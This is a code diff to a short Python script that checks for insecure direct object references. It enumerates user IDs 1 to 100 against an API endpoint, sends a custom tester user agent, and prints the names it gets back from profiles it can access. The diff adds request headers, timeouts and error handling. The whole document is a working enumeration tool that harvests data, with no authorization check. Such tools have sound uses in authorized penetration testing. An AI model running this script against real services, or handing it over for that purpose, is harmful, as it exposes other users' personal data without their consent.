@@ -1,32 +1,37 @@
 import requests
-url = "replace_with_url"
 
-# Set the range of user IDs to test
+url = "https://example.com/api/user/123"  
+
+# Range of user IDs to test
 start_id = 1
 end_id = 100
 
-# Try to access each user's profile page and check for a successful response
+headers = {
+    "User-Agent": "IDOR-Tester/1.0",
+    "Accept": "application/json"
+}
+
 for user_id in range(start_id, end_id + 1):
-    # Replace the user ID in the URL with the current ID we are testing
     test_url = url.replace("123", str(user_id))
-    response = requests.get(test_url)
+    
+    try:
+        response = requests.get(test_url, headers=headers, timeout=5)
+        
+        if response.status_code == 200:
+            print(f"[+] Accessing user ID {user_id}...")
 
-    if response.status_code == 200:
-        # If the status code is 200, access the user's profile page
-        print(f"Accessing user ID {user_id}...")
-
-        # Check if the response contains any data
-        if response.text:
-            # Parse the JSON data in the response
-            data = response.json()
-
-            # Extract the user's name from the data
-            name = data["name"]
-
-            # Print the user's name
-            print(f"User name: {name}")
+            try:
+                data = response.json()  
+                name = data.get("name", "N/A")
+                print(f"    User name: {name}")
+            except ValueError:
+                print(f"    Response not in JSON format for user {user_id}")
+        elif response.status_code == 403:
+            print(f"[-] Access forbidden for user ID {user_id}")
+        elif response.status_code == 404:
+            print(f"[-] User ID {user_id} not found")
         else:
-            print(f"No data in response for user ID {user_id}.")
+            print(f"[?] Unexpected status {response.status_code} for user ID {user_id}")
 
-    else:
-        print(f"Access to user ID {user_id} is restricted.")
+    except requests.exceptions.RequestException as e:
+        print(f"[!] Request failed for user ID {user_id}: {e}")
